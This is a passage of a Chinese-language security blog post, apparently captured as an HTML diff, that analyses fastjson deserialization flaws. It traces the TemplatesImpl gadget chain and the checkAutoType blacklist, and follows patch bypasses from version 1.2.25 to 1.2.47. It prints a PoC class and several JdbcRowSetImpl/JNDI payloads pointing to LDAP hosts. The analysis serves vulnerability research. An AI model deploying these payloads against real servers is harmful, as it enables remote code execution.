 <p>将 payload 部分拆分成如上几个部分，触发部分在<code>_outputProperties</code>中，也就是<code>TemplatesImpl</code>的 <code>getoutputProperties</code><br>为什么是 get？一般 parseObject 中会在最后调用 toJSON 方法，并且在 toJSON 方法中也会调用到 get 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710747589869-cf0190e4-bf63-4850-85b3-5806c7f49bb4.png#averageHue=%23484d5b&clientId=u59ce0523-5c63-4&from=paste&height=242&id=u110e2b7f&originHeight=399&originWidth=1390&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=224688&status=done&style=none&taskId=u3cfb6ce9-8b34-4ae9-a923-f1c1667353f&title=&width=842.4241937334353" referrerpolicy="no-referrer" alt="image.png"><br>我们先跟进到<code>getoutputProperties</code>中<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710747511355-44f922cd-2dd3-4494-b329-20e754fcbfd0.png#averageHue=%23383d46&clientId=u59ce0523-5c63-4&from=paste&height=259&id=ua56e2dde&originHeight=427&originWidth=1075&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=172056&status=done&style=none&taskId=u9c12c330-b477-40ee-b6a2-94eb5d61b98&title=&width=651.515113858592" referrerpolicy="no-referrer" alt="image.png"><br>这里会调用到 newTransformer 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710747647895-fc1f485c-a00e-4906-9ba0-29d1cb237798.png#averageHue=%23383d46&clientId=u59ce0523-5c63-4&from=paste&height=332&id=uba8fba83&originHeight=547&originWidth=1423&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=288928&status=done&style=none&taskId=uaa70f0fd-6384-4aaf-b41b-c0a60b149a6&title=&width=862.4241925774666" referrerpolicy="no-referrer" alt="image.png"><br>在<code>newTransformer</code>方法中又会调用<code>getTransletInstance()</code>方法<br>然后经过 <code>_name</code>参数不为 null，并且<code>_class</code>参数不为 null 的情况下，调用 defineTransletClasses 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710747832652-d1c01fd9-55d2-4a63-bc49-67b13fdcffec.png#averageHue=%23383d45&clientId=u59ce0523-5c63-4&from=paste&height=159&id=u29f2b616&originHeight=299&originWidth=1669&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=151390&status=done&style=none&taskId=u456f6f34-05f9-46fe-986c-3bb217e225a&title=&width=890.1333333333333" referrerpolicy="no-referrer" alt="image.png"><br>然后在 defineTransletClasses 方法中通过 _bytecodes 传递的字节码，通过 defineClass 方法进行类加载（其中还有很多限制条件，这里不做赘述）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710747965310-97e4a1f6-01a3-4e83-b145-273bd3f3797a.png#averageHue=%23363d45&clientId=u59ce0523-5c63-4&from=paste&height=243&id=ufecf2516&originHeight=456&originWidth=1322&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=173518&status=done&style=none&taskId=u92f494c4-70fb-4321-8448-4ade78cf6a2&title=&width=705.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>所以整个的利用链就是:</p>
-<pre><code class="java">getoutputProperties-&gt;newTransformer-&gt;getTransletInstance-&gt;defineTransletClasses-&gt;defineClass 
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">getoutputProperties<span class="token operator">-></span>newTransformer<span class="token operator">-></span>getTransletInstance<span class="token operator">-></span>defineTransletClasses<span class="token operator">-></span>defineClass <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>这里又有一个细节问题，为什么不直接getTransletInstance 开始调用？<br>之前我们分析过 FastJson 获取解析器–getDeserializer 的时候，beaninfo 中获取 get 方法会有限制条件</p>
 <blockquote>
 <p>1.非静态方法<br>2.无参数<br>3.返回类型必须是（或继承自）Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</p>
 </blockquote>
 <p><code>getTransletInstance</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710748829169-d8c4dd93-1b24-4916-8a11-1dd9ed74efbe.png#averageHue=%2337414c&clientId=u59ce0523-5c63-4&from=paste&height=64&id=u50239fff&originHeight=120&originWidth=681&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=31879&status=done&style=none&taskId=u4e5a37fd-7a34-4c78-b63b-89383bff696&title=&width=363.2" referrerpolicy="no-referrer" alt="image.png"><br>返回值不满足第三点条件，所以我们必须往上找其他的利用<br>对于<code>getoutputProperties</code>中，它的返回值是 Properties<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710749440675-f1769edd-8ec7-4e56-a415-c450b8e17d24.png#averageHue=%23383e48&clientId=u59ce0523-5c63-4&from=paste&height=45&id=u22a8f098&originHeight=84&originWidth=810&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=28980&status=done&style=none&taskId=u6eb056b8-b64e-4c6c-8e69-b9b8e2e04f6&title=&width=432" referrerpolicy="no-referrer" alt="image.png"><br>Properties 继承于 HashMap，所以符合条件<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710749480171-ecf41df9-7e17-4d6a-861b-24b0d564473b.png#averageHue=%23383d46&clientId=u59ce0523-5c63-4&from=paste&height=67&id=uf8e664a4&originHeight=125&originWidth=960&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=54165&status=done&style=none&taskId=u8deb8c86-274d-4738-b721-bfe08bde6b7&title=&width=512" referrerpolicy="no-referrer" alt="image.png"></p>
 <h2 id="0x04-补丁修复分析"><a href="#0x04-补丁修复分析" class="headerlink" title="0x04 补丁修复分析"></a>0x04 补丁修复分析</h2><p>研究高版本的防御补丁的思想，以及绕过<br>直到 fastjson-1.2.47 之前的补丁修复绕过，都必须开启AutoTypeSupport<br>测试人员可以添加如下代码进行开启</p>
-<pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <h3 id="1x01-fastjson-1-2-25"><a href="#1x01-fastjson-1-2-25" class="headerlink" title="1x01 fastjson-1.2.25"></a>1x01 fastjson-1.2.25</h3><p>1.2.24 之后的第一次更新，官方引入<code>checkAutoType</code>机制，默认情况下，autoTypeSupport 关闭，不能直接反序列化任意类。打开<code>AutoType</code>之后是基于黑名单来实现安全检测的，fastjson 也提供了添加黑名单的接口<br>集中处理的地方在 ParserConfig，也就是我们通过<code>config.getDeserializer</code>来获取解析器类<br>但是具体的使用却是在<code>DefaultJSONParser</code>中<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710753428551-e5fff72c-21b1-4220-bcc6-775725224140.png#averageHue=%2338414d&clientId=u59ce0523-5c63-4&from=paste&height=105&id=u780b0bc1&originHeight=196&originWidth=2022&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=123447&status=done&style=none&taskId=u8705b3ef-c246-44f0-8194-93766d1b937&title=&width=1078.4" referrerpolicy="no-referrer" alt="image.png"><br>而只有经过这层 checkAutoType 才能继续往下走正常的解析流程<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710753469247-b348203d-211e-491a-9077-52aeef154e27.png#averageHue=%23383e47&clientId=u59ce0523-5c63-4&from=paste&height=71&id=uee0188b4&originHeight=134&originWidth=1582&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=66444&status=done&style=none&taskId=u0b56d8a2-9a3e-49e2-9f5f-1bfc3e8182f&title=&width=843.7333333333333" referrerpolicy="no-referrer" alt="image.png"><br>我们先跟进 parserconfig 类，之后再看具体的方法处理<br>多了很多成员变量，其中包括黑名单和白名单列表，然后多了一个<code>AUTO_SUPPORT</code>安全开关<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710753682976-adaafb61-b942-42b9-8f8b-11783129f0d0.png#averageHue=%23373d45&clientId=u59ce0523-5c63-4&from=paste&height=237&id=ucd8747df&originHeight=444&originWidth=1626&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=248377&status=done&style=none&taskId=u00e09436-c1e5-4d99-a3dc-d4189cd9f88&title=&width=867.2" referrerpolicy="no-referrer" alt="image.png"><br>具体的黑名单如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710753855619-415bd430-eb24-45f2-ac8b-9d1b21ad0f10.png#averageHue=%23373d46&clientId=u59ce0523-5c63-4&from=paste&height=76&id=u2e0c7974&originHeight=143&originWidth=2207&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=112933&status=done&style=none&taskId=u898158bb-5d1b-4cbc-8cb6-21b53a9d857&title=&width=1177.0666666666666" referrerpolicy="no-referrer" alt="image.png"></p>
-<pre><code class="java">bsh
-com.mchange
-com.sun.
-java.lang.Thread
-java.net.Socket
-java.rmi
-javax.xml
-org.apache.bcel
-org.apache.commons.beanutils
-org.apache.commons.collections.Transformer
-org.apache.commons.collections.functors
-org.apache.commons.collections4.comparators
-org.apache.commons.fileupload
-org.apache.myfaces.context.servlet
-org.apache.tomcat
-org.apache.wicket.util
-org.codehaus.groovy.runtime
-org.hibernate
-org.jboss
-org.mozilla.javascript
-org.python.core
-org.springframework
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java">bsh
+com<span class="token punctuation">.</span>mchange
+<span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>
+java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Thread</span>
+<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>Socket</span>
+java<span class="token punctuation">.</span>rmi
+javax<span class="token punctuation">.</span>xml
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>bcel
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils
+<span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span>Transformer</span>
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>fileupload
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>myfaces<span class="token punctuation">.</span>context<span class="token punctuation">.</span>servlet
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat
+org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>wicket<span class="token punctuation">.</span>util
+org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token punctuation">.</span>runtime
+org<span class="token punctuation">.</span>hibernate
+org<span class="token punctuation">.</span>jboss
+org<span class="token punctuation">.</span>mozilla<span class="token punctuation">.</span>javascript
+org<span class="token punctuation">.</span>python<span class="token punctuation">.</span>core
+org<span class="token punctuation">.</span>springframework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>白名单是没有具体定义的，它需要通过一些方法去添加内容</p>
 <blockquote>
 <p>使用代码进行添加：ParserConfig.getGlobalInstance().addAccept(“org.su18.fastjson.,org.javaweb.”)<br>加上JVM启动参数：-Dfastjson.parser.autoTypeAccept&#x3D;org.su18.fastjson.<br>在fastjson.properties中添加：fastjson.parser.autoTypeAccept&#x3D;org.su18.fastjson.</p>
 </blockquote>
 <p>这些我们肯定是无法利用的，都是服务端自己能干的事，还得从其他地方入手<br>我们跟进<code>checkAutoType</code>方法<br>他有几层黑白名单的混合双打，先看第一次<br>如果<code>autoTypeSupport</code>选项开启，那么就会先遍历白名单，匹配目标类是否在其中，如果在就直接加载类，然后遍历黑名单，匹配目标类是否在其中，如果在就抛异常<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710756289095-fa4ddba1-e644-4fab-9ba3-c50676ae8870.png#averageHue=%23373d46&clientId=u59ce0523-5c63-4&from=paste&height=316&id=uee28cba2&originHeight=593&originWidth=2033&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=375516&status=done&style=none&taskId=u43116b97-1de7-42a0-9e5d-87963f47f44&title=&width=1084.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>下面还有一次混合双打，当我们没有开启<code>autoTypeSupport</code>的时候，先遍历黑名单匹配就抛出异常，然后再遍历白名单匹配就直接加载。如果这两次混合双打没有打对地方，那么最后只有一种可能会加载类了—开启 autoTypeSupport 或者 expectClass 不为 null<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710756679508-f34455f3-a3e9-4b4c-87aa-fd00be5b4e22.png#averageHue=%23373d46&clientId=u59ce0523-5c63-4&from=paste&height=541&id=u68004b0c&originHeight=1014&originWidth=1791&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=549609&status=done&style=none&taskId=ub88cd837-670f-4190-a294-a26af740259&title=&width=955.2" referrerpolicy="no-referrer" alt="image.png"><br>问题就出在这最后一手回首掏里面，我们跟进这个最后的 loadClass<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710757188128-6d8da548-8a4c-4efe-9888-dcc0e64b1bb8.png#averageHue=%23373d46&clientId=u59ce0523-5c63-4&from=paste&height=241&id=u913c1e3b&originHeight=452&originWidth=1421&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=196625&status=done&style=none&taskId=u51b008ce-bf65-4224-a3b3-002f386bbdc&title=&width=757.8666666666667" referrerpolicy="no-referrer" alt="image.png"><br>fastjson 这里为了兼容其他 JSON 格式的数据，使用递归调用来处理这些特殊字符<br>于是我们的绕过思路就是在原先反序列化的类名前加上<code>L</code>以及最后加上<code>;</code>,之后也会被递归解析，能够准确找到全类名进行加载<br>Poc</p>
-<pre><code class="java">import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.Feature;
-import com.alibaba.fastjson.parser.ParserConfig;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>
 
 
-public class FastJson_JNDI_LDAP &#123;
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJson_JNDI_LDAP</span> <span class="token punctuation">&#123;</span>
 
-    public static void main(String[] args) &#123;
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">ParserConfig</span><span class="token punctuation">.</span><span class="token function">getGlobalInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAutoTypeSupport</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-        String payload = &quot;&#123;&quot; +
+        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"&#123;"</span> <span class="token operator">+</span>
 
-                &quot;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot; +
+                <span class="token string">"\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\","</span> <span class="token operator">+</span>
 
-                &quot;\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:10389/cn=TestLdap,dc=example,dc=com\&quot;, &quot; +
+                <span class="token string">"\"dataSourceName\":\"ldap://localhost:10389/cn=TestLdap,dc=example,dc=com\", "</span> <span class="token operator">+</span>
 
-                &quot;\&quot;autoCommit\&quot;:true&quot; +
+                <span class="token string">"\"autoCommit\":true"</span> <span class="token operator">+</span>
 
-                &quot;&#125;&quot;;
-        JSON.parseObject(payload, Feature.SupportNonPublicField);
+                <span class="token string">"&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    &#125;
+    <span class="token punctuation">&#125;</span>
 
-&#125;
-</code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 <h3 id="1x02-fastjson-1-2-42-至-1-2-44"><a href="#1x02-fastjson-1-2-42-至-1-2-44" class="headerlink" title="1x02 fastjson-1.2.42 至 1.2.44"></a>1x02 fastjson-1.2.42 至 1.2.44</h3><p>攻防全部集中于此<br>只列出 payload，不做具体分析<br>1.2.42-双写 <code>LL</code> 和<code>;;</code>绕过:</p>
-<pre><code class="java">&#123;
-    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,
-    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,
-    &quot;autoCommit&quot;:true
-&#125;
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
+	<span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"LLcom.sun.rowset.JdbcRowSetImpl;;"</span><span class="token punctuation">,</span>
+	<span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:23457/Command8"</span><span class="token punctuation">,</span>
+	<span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>1.2.43-利用 <code>[</code> 判断的绕过：</p>
-<pre><code class="java">&#123;
-    &quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[,
-    &#123;&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;,
-    &quot;autoCommit&quot;:true
-&#125;
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
+	<span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"[com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">[</span><span class="token punctuation">,</span>
+	<span class="token punctuation">&#123;</span><span class="token string">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:23457/Command8"</span><span class="token punctuation">,</span>
+	<span class="token string">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>1.2.44-GG<br>这个版本的字符串判断的绕过基本上就结束了</p>
 <h3 id="1x03-fastjson-1-2-45"><a href="#1x03-fastjson-1-2-45" class="headerlink" title="1x03 fastjson-1.2.45"></a>1x03 fastjson-1.2.45</h3><p>又爆出来一个黑名单绕过，补充不全</p>
-<pre><code class="java">&#123;
-    &quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,
-    &quot;properties&quot;:&#123;
-        &quot;data_source&quot;:&quot;ldap://127.0.0.1:23457/Command8&quot;
-    &#125;
-&#125;
-</code></pre>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
+    <span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory"</span><span class="token punctuation">,</span>
+    <span class="token string">"properties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
+        <span class="token string">"data_source"</span><span class="token operator">:</span><span class="token string">"ldap://127.0.0.1:23457/Command8"</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="1x04-fastjson-1-2-47"><a href="#1x04-fastjson-1-2-47" class="headerlink" title="1x04 fastjson-1.2.47"></a>1x04 fastjson-1.2.47</h3><p>最严重的一集，上面 1.2.25-1.2.45 版本的绕过都必须建立在 autoType 开启的情况下，本来限制就很大了，而 1.2.47 版本的漏洞则不需要开启这个<br>影响版本有些不同</p>
 <blockquote>
 <p>1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32 未开启 AutoTypeSupport 的情况下<br>1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</p>
 </blockquote>
 <p>漏洞主要发生地点是在 checkautotype 中<br>我们将 fastjson 的版本改为 1.2.47,经过几个版本的更新，checkAutoType 已有些不同，主要也是集中于我们上面总结的漏洞的补丁修改<br>主题内容如下，前面还有一部分是关于<code>;</code>与<code>L</code>字符绕过的处理，包括 hash 处理和直接禁用等等<br>然后就是熟悉的黑白名单混合检测，只不过 for 中我们取出黑名单值变成了 hash 值匹配，内容是一样的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710759429541-08367cfc-13d4-4058-a4c5-0d2cedd8b72f.png#averageHue=%23383d46&clientId=u59ce0523-5c63-4&from=paste&height=317&id=u1f65ae9b&originHeight=595&originWidth=1542&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=308428&status=done&style=none&taskId=uac5e88c8-60d9-4e81-925f-22e3ace25ca&title=&width=822.4" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710759440795-6d653c19-91e8-48f8-81a7-8c516440e681.png#averageHue=%23373d45&clientId=u59ce0523-5c63-4&from=paste&height=326&id=u36fa25da&originHeight=611&originWidth=1565&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=272616&status=done&style=none&taskId=u6d545ebe-9042-4a02-881e-86bc445a12e&title=&width=834.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710759457887-45e9b576-4e1e-4afe-b050-3159de9005f6.png#averageHue=%23373c45&clientId=u59ce0523-5c63-4&from=paste&height=463&id=u5cf66b1e&originHeight=869&originWidth=1556&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=417889&status=done&style=none&taskId=ufc3349c7-6797-4b1b-8180-422e297c7bc&title=&width=829.8666666666667" referrerpolicy="no-referrer" alt="image.png"><br>就算不开启 autoType，也就是第一个 for 循环不进去，我们往后走逻辑，来到个 if 判断处，假如说前两个 if 判断有一个 if 判断的内容满足要求了，我们就能够进入第三个 if 判断，直接 return 出我们的恶意类，就不用去面对恐怖的 autotype 未开启的黑名单检测在前的情况了<br>那么接下来就是关于前两个 if 判断的内容<br>分别是通过调用<code>TypeUtils.getClassFromMapping</code>，从缓存 map 中取出赋值为 clazz ；直接调用<code>deserializers.findClass(typeName)</code>去找有没有这个类<br>但其实最终利用到的还是<code>TypeUtils.getClassFromMapping</code>，因为<code>deserializers.findClass</code>我们无法从中传值，也就是无法写入我们想要的恶意类，也就获取不到 clazz<br>直接看<code>TypeUtils.getClassFromMapping</code><br>对于<code>getClassFromMapping</code>，它的内容仅仅是从 mappings 中取值，但是我们是可以通过<code>TypeUtils.loadClass</code>往里写值的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710759964975-edd47965-21a2-4a63-bf43-59b5071bb821.png#averageHue=%23373e47&clientId=u59ce0523-5c63-4&from=paste&height=89&id=u95d026c7&originHeight=167&originWidth=1179&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=74406&status=done&style=none&taskId=ueba22526-2896-4a1a-aaff-cea4a65165d&title=&width=628.8" referrerpolicy="no-referrer" alt="image.png"><br>直接跟进到<code>TypeUtils.loadClass</code>,内容和我们上面绕过时分析到的逻辑是差不多的,多了一些字符绕过的检测,最后这一个部分仍然没变<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 